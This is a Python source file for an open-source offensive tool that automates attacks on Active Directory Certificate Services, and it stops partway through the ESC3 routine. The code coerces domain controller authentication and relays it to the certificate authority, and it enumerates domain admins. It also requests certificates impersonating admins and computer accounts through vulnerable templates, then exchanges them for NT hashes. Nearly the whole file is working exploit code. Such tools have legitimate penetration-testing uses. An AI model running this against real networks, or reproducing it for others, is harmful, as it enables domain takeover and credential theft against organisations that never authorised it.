#!/usr/bin/python3

""" ADCS exploitation automation

This tool tries to automate the process of exploiting ADCS by weaponizing certipy. 
Improved version with LDAPS support and better error handling.

References:
https://github.com/ly4k/Certipy
https://github.com/p0dalirius/Coercer

MIT License

Copyright (c) 2023 grimlockx

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

__author__ = "grimlockx"
__license__ = "MIT"
__version__ = "0.4"

import argparse
import subprocess
import re
import ldap3
import json
import threading
import time
import logging
import ssl
from datetime import datetime
from pathlib import Path


class Logger:
    """Enhanced logging functionality"""
    
    def __init__(self, output_dir=".", verbose=False):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        # Setup logging
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        logging.basicConfig(
            level=logging.DEBUG if verbose else logging.INFO,
            format=log_format,
            handlers=[
                logging.FileHandler(self.output_dir / 'adcskiller.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def info(self, message):
        self.logger.info(message)
        
    def error(self, message):
        self.logger.error(message)
        
    def debug(self, message):
        self.logger.debug(message)
        
    def warning(self, message):
        self.logger.warning(message)


class AuthenticationManager:
    """Handle various authentication methods"""
    
    def __init__(self, domain, username, password=None, ntlm_hash=None, 
                 kerberos_ticket=None, aes_key=None, use_kerberos=False):
        self.domain = domain
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.kerberos_ticket = kerberos_ticket
        self.aes_key = aes_key
        self.use_kerberos = use_kerberos
        
    def get_certipy_auth_args(self):
        """Get authentication arguments for certipy"""
        if self.kerberos_ticket:
            return f"-u {self.username}@{self.domain} -k -no-pass"
        elif self.aes_key:
            return f"-u {self.username}@{self.domain} -aes {self.aes_key}"
        elif self.ntlm_hash:
            return f"-u {self.username}@{self.domain} -hashes {self.ntlm_hash}"
        elif self.password:
            auth_args = f"-u {self.username}@{self.domain} -p {self.password}"
            if self.use_kerberos:
                auth_args += " -k"
            return auth_args
        else:
            raise ValueError("No authentication method provided")
    
    def get_coercer_auth_args(self):
        """Get authentication arguments for coercer"""
        if self.ntlm_hash:
            return f"-d {self.domain} -u '{self.username}' --hashes {self.ntlm_hash}"
        elif self.password:
            return f"-d {self.domain} -u '{self.username}' -p '{self.password}'"
        else:
            raise ValueError("Coercer requires password or NTLM hash")


class LDAPConnection:
    """Enhanced LDAP connection with LDAPS support"""
    
    def __init__(self, target, domain, username, password=None, ntlm_hash=None,
                 use_ldaps=False, ldap_channel_binding=False, port=None):
        self.target = target
        self.domain = domain
        self.domain_parts = domain.split(".")
        self.domain_cn = ','.join([f'dc={part}' for part in self.domain_parts])
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.use_ldaps = use_ldaps
        self.ldap_channel_binding = ldap_channel_binding
        
        # Determine port
        if port:
            self.port = port
        else:
            self.port = 636 if use_ldaps else 389
            
        self.connection = None
        
    def connect(self):
        """Establish LDAP/LDAPS connection"""
        # Setup TLS configuration for LDAPS
        tls_config = None
        if self.use_ldaps:
            tls_config = ldap3.Tls(
                validate=ssl.CERT_NONE,
                version=ssl.PROTOCOL_TLS,
                channel_binding=ldap3.CHANNEL_BINDING_TYPE.TLS_CHANNEL_BINDING if self.ldap_channel_binding else None
            )
        
        server = ldap3.Server(
            self.target,
            port=self.port,
            use_ssl=self.use_ldaps,
            get_info=ldap3.ALL,
            tls=tls_config
        )
        
        # Determine authentication method
        if self.ntlm_hash:
            # Use NTLM authentication with hash
            user_dn = f"{self.domain_parts[0]}\\{self.username}"
            authentication = ldap3.NTLM
            password = self.ntlm_hash
        else:
            # Use simple bind with password
            user_dn = f"{self.domain_parts[0]}\\{self.username}"
            authentication = ldap3.NTLM
            password = self.password
        
        try:
            self.connection = ldap3.Connection(
                server,
                user=user_dn,
                password=password,
                authentication=authentication,
                auto_bind=True,
                raise_exceptions=True
            )
            
            # Verify the connection is working by attempting a basic search
            try:
                test_search = self.connection.search(
                    search_base="",
                    search_filter="(objectClass=*)",
                    search_scope=ldap3.BASE,
                    attributes=[]
                )
                if not test_search:
                    logging.warning(f"Test search failed: {self.connection.result}")
            except Exception as test_e:
                logging.warning(f"Connection test search failed: {test_e}")
            
            return True
        except ldap3.core.exceptions.LDAPBindError as e:
            logging.error(f"LDAP bind failed: {e}")
            return False
        except ldap3.core.exceptions.LDAPException as e:
            logging.error(f"LDAP connection error: {e}")
            return False
        except Exception as e:
            logging.error(f"LDAP connection failed: {e}")
            return False
    
    def search(self, search_base, search_filter, attributes=None):
        """Perform LDAP search"""
        if not self.connection:
            raise Exception("LDAP connection not established")
        
        # Check if connection is still bound
        if not self.connection.bound:
            logging.error("LDAP connection is not bound")
            return []
            
        try:
            # Perform the search
            success = self.connection.search(
                search_base=search_base,
                search_filter=search_filter,
                attributes=attributes or ldap3.ALL_ATTRIBUTES
            )
            
            if not success:
                logging.error(f"LDAP search failed: {self.connection.result}")
                return []
                
            return self.connection.entries
            
        except ldap3.core.exceptions.LDAPInvalidServerError as e:
            logging.error(f"LDAP server error during search: {e}")
            return []
        except ldap3.core.exceptions.LDAPException as e:
            logging.error(f"LDAP exception during search: {e}")
            return []
        except Exception as e:
            logging.error(f"Unexpected error during LDAP search: {e}")
            return []
    
    def close(self):
        """Close LDAP connection"""
        if self.connection:
            self.connection.unbind()


class CertipyRelay(threading.Thread):
    """Certipy relay thread"""
    
    def __init__(self, thread_id, name, ca, template="DomainController"):
        threading.Thread.__init__(self)
        self.thread_id = thread_id
        self.name = name
        self.target_ca = ca
        self.template = template
        
    def run(self):
        logging.info(f'Started Relaying to {self.target_ca}')
        try:
            cmd = ["certipy", "relay", "-target", f"http://{self.target_ca}", "-template", self.template]
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            for line in process.stdout:
                print(line.strip())
                
        except Exception as e:
            logging.error(f"Certipy relay failed: {e}")


class Coercer(threading.Thread):
    """Coercer thread for authentication coercion"""
    
    def __init__(self, thread_id, name, auth_manager, target_dc, lhost):
        threading.Thread.__init__(self)
        self.thread_id = thread_id
        self.name = name
        self.auth_manager = auth_manager
        self.target_dc = target_dc
        self.lhost = lhost
        
    def run(self):
        logging.info(f'Started coercion from {self.target_dc} to {self.lhost}')
        try:
            auth_args = self.auth_manager.get_coercer_auth_args()
            cmd = f"Coercer coerce {auth_args} -t {self.target_dc} -l {self.lhost} --always-continue"
            
            result = subprocess.run(
                cmd.split(),
                capture_output=True,
                text=True,
                timeout=300  # 5 minute timeout
            )
            
            if result.returncode == 0:
                logging.info(f'Finished coercion from {self.target_dc} to {self.lhost}')
            else:
                logging.error(f'Coercion failed: {result.stderr}')
                
        except subprocess.TimeoutExpired:
            logging.error("Coercion timed out")
        except Exception as e:
            logging.error(f"Coercion failed: {e}")


class ADCSExploit:
    """Main ADCS exploitation class"""
    
    def __init__(self, domain, username, password=None, ntlm_hash=None, 
                 target=None, lhost=None, use_ldaps=False, ldap_channel_binding=False,
                 output_dir=".", verbose=False, dns_tcp=False, timeout=100, debug=False):
        
        self.domain = domain
        self.domain_parts = domain.split(".")
        self.domain_cn = ','.join([f'dc={part}' for part in self.domain_parts])
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.target = target
        self.lhost = lhost
        self.use_ldaps = use_ldaps
        self.ldap_channel_binding = ldap_channel_binding
        self.dns_tcp = dns_tcp
        self.timeout = timeout
        self.debug = debug
        
        # Initialize components
        self.logger = Logger(output_dir, verbose)
        self.auth_manager = AuthenticationManager(domain, username, password, ntlm_hash)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        # Initialize data structures
        self.domain_admins = []
        self.vulnerable_certificate_templates = {}
        self.vulnerabilities = []
        self.domain_controllers = []
        self.certipy_output_prefix = None
        self.ca = None
        self.ca_dns = None
        
    def get_certipy_results(self):
        """Run certipy to find vulnerable certificate templates"""
        current_datetime = datetime.now()
        self.certipy_output_prefix = current_datetime.strftime("%Y%m%d%H%M%S")
        
        self.logger.info("Trying to find vulnerable certificate templates")
        
        # Build certipy command
        auth_args = self.auth_manager.get_certipy_auth_args()
        
        # Create full output path
        output_path = self.output_dir / self.certipy_output_prefix
        
        cmd = [
            "certipy", "find",
            *auth_args.split(),
            "-dc-ip", self.target,
            "-vulnerable", "-json",
            "-output", str(output_path),
            "-timeout", str(self.timeout)
        ]
        
        # Add LDAP options
        if self.use_ldaps:
            cmd.extend(["-ldap-scheme", "ldaps"])
            if not self.ldap_channel_binding:
                cmd.append("-no-ldap-channel-binding")
        else:
            cmd.extend(["-ldap-scheme", "ldap"])
        
        # Add DNS TCP option
        if self.dns_tcp:
            cmd.append("-dns-tcp")
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.timeout + 30
            )
            
            # Log the certipy output for debugging
            self.logger.debug(f"Certipy stdout: {result.stdout}")
            self.logger.debug(f"Certipy stderr: {result.stderr}")
            
            if "Invalid credentials" in result.stdout:
                self.logger.error("Invalid credentials")
                return False
            elif "timed out" in result.stdout:
                self.logger.error("Connection timed out")
                return False
            elif result.returncode == 0:
                # Check if the JSON file was actually created
                expected_json = self.output_dir / f"{self.certipy_output_prefix}_Certipy.json"
                
                # Also check in current directory (certipy might save there)
                current_dir_json = Path(f"{self.certipy_output_prefix}_Certipy.json")
                
                if expected_json.exists():
                    self.logger.info(f"Saved certipy output to {self.certipy_output_prefix}_Certipy.json")
                    return True
                elif current_dir_json.exists():
                    # Move file to output directory
                    current_dir_json.rename(expected_json)
                    self.logger.info(f"Moved certipy output to {expected_json}")
                    return True
                else:
                    self.logger.error(f"Certipy JSON file not found in expected locations")
                    self.logger.debug(f"Looked for: {expected_json} and {current_dir_json}")
                    
                    # List files in current directory for debugging
                    current_files = list(Path('.').glob(f"*{self.certipy_output_prefix}*"))
                    output_files = list(self.output_dir.glob(f"*{self.certipy_output_prefix}*"))
                    self.logger.debug(f"Files in current dir: {current_files}")
                    self.logger.debug(f"Files in output dir: {output_files}")
                    return False
            else:
                self.logger.error(f"Certipy command failed: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            self.logger.error("Certipy command timed out")
            return False
        except Exception as e:
            self.logger.error(f"Certipy command execution failed: {e}")
            self.logger.debug(f"Full error: {e}", exc_info=True)
            return False
    
    def bind_to_ldap(self):
        """Establish LDAP connection"""
        self.logger.info("Attempting LDAP connection")
        
        ldap_conn = LDAPConnection(
            self.target, self.domain, self.username,
            self.password, self.ntlm_hash, self.use_ldaps,
            self.ldap_channel_binding
        )
        
        if ldap_conn.connect():
            self.ldap_connection = ldap_conn
            protocol = "LDAPS" if self.use_ldaps else "LDAP"
            self.logger.info(f"{protocol} connection successful")
            return True
        else:
            self.logger.error("LDAP connection failed")
            return False
    
    def get_domain_admins(self):
        """Enumerate domain administrators"""
        if not hasattr(self, 'ldap_connection'):
            self.logger.error("LDAP connection required")
            return
        
        try:
            # Get domain SID
            self.logger.info("Getting Domain SID")
            self.logger.debug(f"Using domain DN: {self.domain_cn}")
            response = self.ldap_connection.search(
                self.domain_cn,
                '(objectClass=domain)',
                ['objectSID']
            )
            
            if response and len(response) > 0:
                domain_sid = str(response[0].objectSid)
                self.logger.info(f"Received Domain SID: {domain_sid}")
            else:
                self.logger.error("Could not retrieve domain SID")
                # Set some common domain admin accounts as fallback
                self.domain_admins = ["Administrator", "admin", "root"]
                self.logger.warning(f"Using default admin account names: {self.domain_admins}")
                return
            
            # Get Domain Admins group
            admin_group_filter = f'(&(objectCategory=group)(objectSid={domain_sid}-512))'
            response = self.ldap_connection.search(
                self.domain_cn,
                admin_group_filter,
                ['sAMAccountName']
            )
            
            if response and len(response) > 0:
                domain_admins_cn = str(response[0].sAMAccountName)
                self.logger.info(f"Domain Admins group: {domain_admins_cn}")
            else:
                self.logger.warning("Could not find Domain Admins group")
                return
            
            # Get members of Domain Admins
            admin_members_filter = f'(&(objectCategory=group)(cn={domain_admins_cn}))'
            response = self.ldap_connection.search(
                self.domain_cn,
                admin_members_filter,
                ['member']
            )
            
            if response and len(response) > 0 and hasattr(response[0], 'member'):
                for member_dn in response[0].member:
                    # Extract CN from DN
                    cn_match = re.search(r'CN=([^,]+)', str(member_dn))
                    if cn_match:
                        self.domain_admins.append(cn_match.group(1))
                
                self.logger.info(f"Found Domain Administrators: {', '.join(self.domain_admins)}")
            else:
                self.logger.warning("Could not enumerate Domain Administrators")
                
        except Exception as e:
            self.logger.error(f"Error enumerating domain admins: {e}")
            self.logger.debug(f"Full error: {e}", exc_info=True)
    
    def fetch_certipy_results(self):
        """Parse certipy JSON output"""
        json_file = self.output_dir / f"{self.certipy_output_prefix}_Certipy.json"
        
        self.logger.debug(f"Looking for certipy JSON file at: {json_file}")
        
        if not json_file.exists():
            # Also check in current directory
            current_dir_json = Path(f"{self.certipy_output_prefix}_Certipy.json")
            if current_dir_json.exists():
                # Move to output directory
                current_dir_json.rename(json_file)
                self.logger.info(f"Found and moved certipy JSON file to {json_file}")
            else:
                self.logger.error(f"Certipy JSON file not found: {json_file}")
                # List available files for debugging
                json_files = list(Path('.').glob("*_Certipy.json"))
                output_json_files = list(self.output_dir.glob("*_Certipy.json"))
                self.logger.debug(f"Available JSON files in current dir: {json_files}")
                self.logger.debug(f"Available JSON files in output dir: {output_json_files}")
                return {}
        
        try:
            self.logger.info(f"Parsing certipy output {self.certipy_output_prefix}_Certipy.json")
            with open(json_file, 'r') as f:
                certipy_json = json.load(f)
            
            # Extract CA information
            if "Certificate Authorities" in certipy_json and "0" in certipy_json["Certificate Authorities"]:
                ca_info = certipy_json["Certificate Authorities"]["0"]
                self.ca = ca_info.get("CA Name")
                self.ca_dns = ca_info.get("DNS Name")
                
                self.logger.debug(f"Found CA: {self.ca} at {self.ca_dns}")
                
                # Extract vulnerabilities
                vulnerabilities = ca_info.get("[!] Vulnerabilities", {})
                self.vulnerabilities = [key for key, value in vulnerabilities.items() if value]
                
                if self.vulnerabilities:
                    self.logger.info(f"Found vulnerabilities: {self.vulnerabilities}")
            
            # Extract vulnerable templates
            if "Certificate Templates" in certipy_json:
                for template in certipy_json["Certificate Templates"].values():
                    if "[!] Vulnerabilities" in template:
                        template_vulns = template["[!] Vulnerabilities"]
                        template_name = template.get("Template Name")
                        
                        # Dynamically detect all ESC vulnerabilities (ESC1, ESC2, ..., ESC15, etc.)
                        for vuln_key, vuln_value in template_vulns.items():
                            if vuln_key.startswith('ESC') and vuln_value:
                                if vuln_key not in self.vulnerable_certificate_templates:
                                    self.vulnerable_certificate_templates[vuln_key] = []
                                self.vulnerable_certificate_templates[vuln_key].append(template_name)
                
                if self.vulnerable_certificate_templates:
                    self.logger.info("Found vulnerable certificate templates:")
                    for esc, templates in self.vulnerable_certificate_templates.items():
                        self.logger.info(f"{esc}: {', '.join(templates)}")
                else:
                    self.logger.info("No vulnerable certificate templates found")
            
            return self.vulnerable_certificate_templates
            
        except Exception as e:
            self.logger.error(f"Error parsing certipy results: {e}")
            self.logger.debug(f"Full error: {e}", exc_info=True)
            return {}
    
    def get_domain_controllers(self):
        """Enumerate domain controllers"""
        if not hasattr(self, 'ldap_connection'):
            self.logger.error("LDAP connection required")
            return
        
        try:
            self.logger.info("Getting Domain Controllers")
            dc_filter = '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
            response = self.ldap_connection.search(
                self.domain_cn,
                dc_filter,
                ['distinguishedName', 'dNSHostName', 'name']
            )
            
            for entry in response:
                dns_name = None
                
                # Try to get dNSHostName first
                if hasattr(entry, 'dNSHostName') and entry.dNSHostName:
                    dns_name = str(entry.dNSHostName)
                elif hasattr(entry, 'name') and entry.name:
                    # Construct FQDN from name
                    hostname = str(entry.name)
                    if hostname.endswith('$'):
                        hostname = hostname[:-1]  # Remove trailing $
                    dns_name = f"{hostname}.{self.domain}"
                elif hasattr(entry, 'distinguishedName'):
                    # Extract hostname from DN as last resort
                    dn = str(entry.distinguishedName)
                    cn_match = re.search(r'CN=([^,]+)', dn)
                    if cn_match:
                        hostname = cn_match.group(1)
                        if hostname.endswith('$'):
                            hostname = hostname[:-1]
                        dns_name = f"{hostname}.{self.domain}"
                
                if dns_name:
                    self.domain_controllers.append(dns_name)
                    self.logger.debug(f"Found DC: {dns_name}")
            
            if self.domain_controllers:
                self.logger.info(f"Found domain controllers: {', '.join(self.domain_controllers)}")
            else:
                self.logger.warning("No domain controllers found")
                # Use the target DC IP as fallback
                self.domain_controllers = [self.target]
                self.logger.warning(f"Using target DC as fallback: {self.target}")
                
        except Exception as e:
            self.logger.error(f"Error enumerating domain controllers: {e}")
            self.logger.debug(f"Full error: {e}", exc_info=True)
    
    def request_certificate_with_fallback(self, admin, template, output_suffix="", extra_args=None):
        """Request certificate with multiple enrollment method fallbacks"""
        auth_args = self.auth_manager.get_certipy_auth_args()
        extra_args = extra_args or []
        
        base_cmd = [
            "certipy", "req",
            *auth_args.split(),
            "-target", self.target,
            "-ca", self.ca,
            "-template", template,
            "-upn", admin,
            "-out", f"{template}_{admin}{output_suffix}",
            "-key-size", "4096"
        ]
        
        # Add extra arguments (like -application-policies for ESC15)
        base_cmd.extend(extra_args)
        
        # Add LDAP options
        if self.use_ldaps:
            base_cmd.extend(["-ldap-scheme", "ldaps"])
            if not self.ldap_channel_binding:
                base_cmd.append("-no-ldap-channel-binding")
        else:
            base_cmd.extend(["-ldap-scheme", "ldap"])
        
        # Add debug flag if enabled
        if self.debug:
            base_cmd.append("-debug")
        
        # Try different enrollment methods in order of preference
        enrollment_methods = [
            {"name": "RPC", "args": []},
            {"name": "Web Enrollment", "args": ["-web"]},
            {"name": "DCOM", "args": ["-dcom"]}
        ]
        
        # Also try different subject formats for ESC1-like attacks
        subject_alternatives = [
            admin,  # Original UPN
            f"{admin}@{self.domain}" if "@" not in admin else admin,  # UPN format
            f"CN={admin}",  # CN format
        ]
        
        # Remove duplicates while preserving order
        subject_alternatives = list(dict.fromkeys(subject_alternatives))
        
        # Try each subject alternative with each enrollment method
        for subject_alt in subject_alternatives:
            # Update the UPN in the command
            cmd_with_subject = base_cmd.copy()
            upn_index = cmd_with_subject.index("-upn") + 1
            cmd_with_subject[upn_index] = subject_alt
            
            for method in enrollment_methods:
                cmd = cmd_with_subject + method["args"]
                
                try:
                    self.logger.debug(f"Trying {method['name']} enrollment for {subject_alt} using template {template}")
                    
                    result = subprocess.run(
                        cmd,
                        capture_output=True,
                        text=True,
                        cwd=self.output_dir,
                        timeout=120
                    )
                    
                    if "Got certificate" in result.stdout:
                        self.logger.info(f"Got certificate for {subject_alt} using template {template} via {method['name']}")
                        return True, result
                    elif "Failed to resolve dynamic endpoint" in result.stdout or "ept_s_not_registered" in result.stdout:
                        self.logger.debug(f"{method['name']} failed with RPC endpoint error, trying next method")
                        continue
                    elif "Failed to get DCE RPC connection" in result.stdout:
                        self.logger.debug(f"{method['name']} failed with RPC connection error, trying next method")
                        continue
                    elif "rpc_s_access_denied" in result.stdout:
                        self.logger.debug(f"{method['name']} failed with access denied for {subject_alt}, trying next subject/method")
                        continue
                    elif "The request was not allowed by the security descriptor" in result.stdout:
                        self.logger.debug(f"Security descriptor denied enrollment for {subject_alt}, trying next subject/method")
                        continue
                    else:
                        self.logger.debug(f"{method['name']} failed for {subject_alt}")
                        self.logger.debug(f"stdout: {result.stdout[:200]}...")
                        if result.stderr:
                            self.logger.debug(f"stderr: {result.stderr[:200]}...")
                        continue
                        
                except subprocess.TimeoutExpired:
                    self.logger.warning(f"{method['name']} enrollment timed out for {subject_alt}")
                    continue
                except Exception as e:
                    self.logger.debug(f"{method['name']} enrollment failed for {subject_alt}: {e}")
                    continue
        
        # If all methods failed, return the last result for logging
        return False, result if 'result' in locals() else None
    
    def test_template_enrollment(self, template):
        """Test if we can enroll in a template with current user credentials"""
        self.logger.info(f"Testing enrollment permissions for template {template}")
        
        auth_args = self.auth_manager.get_certipy_auth_args()
        
        # Try to enroll with current username first
        test_cmd = [
            "certipy", "req",
            *auth_args.split(),
            "-target", self.target,
            "-ca", self.ca,
            "-template", template,
            "-out", f"test_{template}"
        ]
        
        # Add LDAP options
        if self.use_ldaps:
            test_cmd.extend(["-ldap-scheme", "ldaps"])
            if not self.ldap_channel_binding:
                test_cmd.append("-no-ldap-channel-binding")
        else:
            test_cmd.extend(["-ldap-scheme", "ldap"])
        
        try:
            result = subprocess.run(
                test_cmd,
                capture_output=True,
                text=True,
                cwd=self.output_dir,
                timeout=60
            )
            
            if "Got certificate" in result.stdout:
                self.logger.info(f"Successfully enrolled in template {template} with current user")
                # Clean up test certificate
                test_cert = self.output_dir / f"test_{template}.pfx"
                if test_cert.exists():
                    test_cert.unlink()
                return True
            elif "rpc_s_access_denied" in result.stdout:
                self.logger.warning(f"Access denied for template {template} - current user lacks enrollment permissions")
                return False
            elif "The request was not allowed by the security descriptor" in result.stdout:
                self.logger.warning(f"Security descriptor denies enrollment for template {template}")
                return False
            else:
                self.logger.debug(f"Template {template} test enrollment failed: {result.stdout[:200]}...")
                return False
                
        except subprocess.TimeoutExpired:
            self.logger.warning(f"Template {template} test enrollment timed out")
            return False
        except Exception as e:
            self.logger.error(f"Template {template} test enrollment failed: {e}")
            return False
    
    def is_computer_template(self, template_name):
        """Determine if a template is likely designed for computer accounts"""
        computer_indicators = [
            'computer', 'machine', 'server', 'workstation', 'domain controller',
            'dc', 'host', 'kerberos', 'rras', 'ipsec', 'router', 'device'
        ]
        
        template_lower = template_name.lower()
        return any(indicator in template_lower for indicator in computer_indicators)
    
    def get_computer_targets(self):
        """Get list of high-value computer accounts to target"""
        targets = []
        
        # Add domain controllers (highest priority)
        for dc in self.domain_controllers:
            # Extract hostname from FQDN
            hostname = dc.split('.')[0]
            targets.append(f"{hostname}$")
        
        # Add some common server names to try
        common_servers = ['EXCHANGE', 'SQL', 'WEB', 'FILE', 'PRINT', 'APP', 'DB']
        for server in common_servers:
            targets.append(f"{server}$")
        
        return targets
    
    def exploit_esc1(self):
        """Exploit ESC1 vulnerability"""
        if "ESC1" not in self.vulnerable_certificate_templates:
            return
        
        self.logger.info("Exploiting ESC1 vulnerability")
        
        # Categorize templates by type and test enrollment appropriately
        user_templates = []
        computer_templates = []
        
        for template in self.vulnerable_certificate_templates["ESC1"]:
            if self.is_computer_template(template):
                self.logger.info(f"Template {template} detected as computer template - will attempt computer account enrollment")
                computer_templates.append(template)
            else:
                # Test user template enrollment with current user
                if self.test_template_enrollment(template):
                    user_templates.append(template)
                else:
                    self.logger.warning(f"Skipping user template {template} - no enrollment permissions")
        
        if not user_templates and not computer_templates:
            self.logger.error("No ESC1 templates available for enrollment")
            return
        
        if user_templates:
            self.logger.info(f"Found {len(user_templates)} enrollable user templates: {', '.join(user_templates)}")
        if computer_templates:
            self.logger.info(f"Found {len(computer_templates)} computer templates to attempt: {', '.join(computer_templates)}")
        
        # Process computer templates first (often higher impact)
        for template in computer_templates:
            self.logger.info(f"Exploiting computer template {template} - targeting high-value computer accounts")
            
            # Try high-value computer accounts
            computer_targets = self.get_computer_targets()
            for computer in computer_targets:
                self.logger.info(f"Requesting certificate for computer {computer} using template {template}")
                
                # Use computer account UPN format
                computer_upn = f"{computer}@{self.domain}"
                success, result = self.request_certificate_with_fallback(
                    computer_upn, template, f"_{computer.replace('$', '_comp')}"
                )
                
                if success:
                    # Try to authenticate with the certificate
                    cert_file = self.output_dir / f"{template}_{computer_upn}_{computer.replace('$', '_comp')}.pfx"
                    if cert_file.exists():
                        self.logger.info(f"Got certificate for computer {computer} - this could provide computer account access!")
                        
                        # Note: Computer certificates can be used for Silver Tickets, DCSync, etc.
                        auth_cmd = [
                            "certipy", "auth",
                            "-pfx", str(cert_file),
                            "-domain", self.domain,
                            "-username", computer,
                            "-dc-ip", self.target
                        ]
                        
                        try:
                            auth_result = subprocess.run(
                                auth_cmd,
                                capture_output=True,
                                text=True,
                                timeout=60
                            )
                            
                            if "Got hash for" in auth_result.stdout:
                                hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
                                if hash_match:
                                    nt_hash = hash_match.group(1)
                                    self.logger.info(f"Received NT hash for computer {computer}: {nt_hash}")
                                    if "DC" in computer.upper() or computer.replace('$', '') in [dc.split('.')[0] for dc in self.domain_controllers]:
                                        self.logger.info(f"*** DOMAIN CONTROLLER COMPROMISED *** - Computer {computer} NT hash obtained!")
                        except subprocess.TimeoutExpired:
                            self.logger.error(f"Certificate authentication timed out for computer {computer}")
                        except Exception as e:
                            self.logger.error(f"Certificate authentication failed for computer {computer}: {e}")
                else:
                    if result:
                        self.logger.debug(f"Failed to get certificate for computer {computer}: {result.stdout[:200]}...")
        
        # Process user templates
        for template in user_templates:
            self.logger.info(f"Exploiting user template {template} - targeting domain administrators")
            
            # Try domain admin user accounts
            for admin in self.domain_admins:
                self.logger.info(f"Requesting certificate for user {admin} using template {template}")
                
                success, result = self.request_certificate_with_fallback(admin, template)
                
                if success:
                    # Try to authenticate with the certificate
                    cert_file = self.output_dir / f"{template}_{admin}.pfx"
                    if cert_file.exists():
                        auth_cmd = [
                            "certipy", "auth",
                            "-pfx", str(cert_file),
                            "-domain", self.domain,
                            "-username", admin,
                            "-dc-ip", self.target
                        ]
                        
                        try:
                            auth_result = subprocess.run(
                                auth_cmd,
                                capture_output=True,
                                text=True,
                                timeout=60
                            )
                            
                            if "Got hash for" in auth_result.stdout:
                                hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
                                if hash_match:
                                    nt_hash = hash_match.group(1)
                                    self.logger.info(f"Received NT hash for {admin}: {nt_hash}")
                        except subprocess.TimeoutExpired:
                            self.logger.error(f"Certificate authentication timed out for {admin}")
                        except Exception as e:
                            self.logger.error(f"Certificate authentication failed for {admin}: {e}")
                else:
                    if result:
                        self.logger.debug(f"Failed to get certificate for {admin}: {result.stdout[:200]}...")
                    else:
                        self.logger.error(f"Failed to get certificate for {admin} - all enrollment methods failed")
    
    def exploit_esc2(self):
        """Exploit ESC2 vulnerability (Any Purpose EKU)"""
        if "ESC2" not in self.vulnerable_certificate_templates:
            return
        
        self.logger.info("Exploiting ESC2 vulnerability")
        
        for admin in self.domain_admins:
            for template in self.vulnerable_certificate_templates["ESC2"]:
                self.logger.info(f"Requesting certificate for {admin} using template {template} (ESC2)")
                
                # Use UPN with domain for ESC2
                admin_upn = f"{admin}@{self.domain}" if "@" not in admin else admin
                success, result = self.request_certificate_with_fallback(
                    admin_upn, template, "_esc2"
                )
                
                if success:
                    # Try to authenticate with the certificate
                    cert_file = self.output_dir / f"{template}_{admin_upn}_esc2.pfx"
                    if cert_file.exists():
                        auth_cmd = [
                            "certipy", "auth",
                            "-pfx", str(cert_file),
                            "-domain", self.domain,
                            "-username", admin,
                            "-dc-ip", self.target
                        ]
                        
                        try:
                            auth_result = subprocess.run(
                                auth_cmd,
                                capture_output=True,
                                text=True,
                                timeout=60
                            )
                            
                            if "Got hash for" in auth_result.stdout:
                                hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
                                if hash_match:
                                    nt_hash = hash_match.group(1)
                                    self.logger.info(f"Received NT hash for {admin} via ESC2: {nt_hash}")
                        except subprocess.TimeoutExpired:
                            self.logger.error(f"Certificate authentication timed out for {admin} (ESC2)")
                        except Exception as e:
                            self.logger.error(f"Certificate authentication failed for {admin} (ESC2): {e}")
                else:
                    if result:
                        self.logger.warning(f"Failed to get certificate for {admin} (ESC2) using all enrollment methods")
                    else:
                        self.logger.error(f"Failed to get certificate for {admin} (ESC2) - all enrollment methods failed")
    
    def exploit_esc3(self):
        """Exploit ESC3 vulnerability (Certificate Request Agent)"""
        if "ESC3" not in self.vulnerable_certificate_templates:
            return
        
        self.logger.info("Exploiting ESC3 vulnerability")
        
        # First, get an enrollment agent certificate
        for template in self.vulnerable_certificate_templates["ESC3"]:
            self.logger.info(f"Requesting enrollment agent certificate using template {template}")
            
            auth_args = self.auth_manager.get_certipy_auth_args()
            
            cmd = [
                "certipy", "req",
                *auth_args.split(),
                "-target", self.target,
                "-ca", self.ca,
                "-template", template,
                "-out", f"{template}_agent",
                "-key-size", "4096"
            ]
            
            # Add LDAP options
            if self.use_ldaps:
                cmd.extend(["-ldap-scheme", "ldaps"])
                if not self.ldap_channel_binding:
                    cmd.append("-no-ldap-channel-binding")
            else:
                cmd.extend(["-ldap-scheme", "ldap"])
            
            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    cwd=self.output_dir,
                    timeout=120
                )
                
                if "Got certificate" in result.stdout:
                    self.logger.info(f"Got enrollment agent certificate using template {template}")
                    
                    agent_cert = self.output_dir / f"{template}_agent.pfx"
                    if agent_cert.exists():
                        # Now use the agent certificate to request certificates for domain admins
                        for admin in self.domain_admins:
